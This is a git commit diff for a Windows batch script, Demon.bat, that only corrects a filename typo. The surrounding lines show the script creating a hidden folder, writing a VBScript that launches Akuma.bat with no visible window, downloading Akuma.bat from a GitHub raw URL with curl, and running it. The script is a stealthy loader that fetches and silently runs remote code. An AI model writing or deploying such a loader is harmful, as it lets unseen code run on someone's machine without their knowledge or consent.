fa0f37c0ba832dd2f9cfdb540c174231c2b6e3e9
l_ <112792604+l-urk@users.noreply.github.com>
2023-10-17 13:23:32 -0700

    Update Demon.bat

--- Demon.bat
+++ Demon.bat
@@ -3,7 +3,7 @@ rmdir /s /q %homedrive%\Demon
 mkdir %homedrive%\Demon
 attrib +h %homedrive%\Demon
 cd %homedrive%\Demon
-echo Set objShell = CreateObject("WScript.Shell") >> %homedrive%\Demon\Deomn.vbs
+echo Set objShell = CreateObject("WScript.Shell") >> %homedrive%\Demon\Demon.vbs
 echo objShell.Run "%homedrive%\Demon\Akuma.bat", 0, False >> %homedrive%\Demon\Demon.vbs
 curl -O https://raw.githubusercontent.com/l-urk/Akuma/main/Akuma.bat
 start %homedrive%\Demon\Demon.vbs
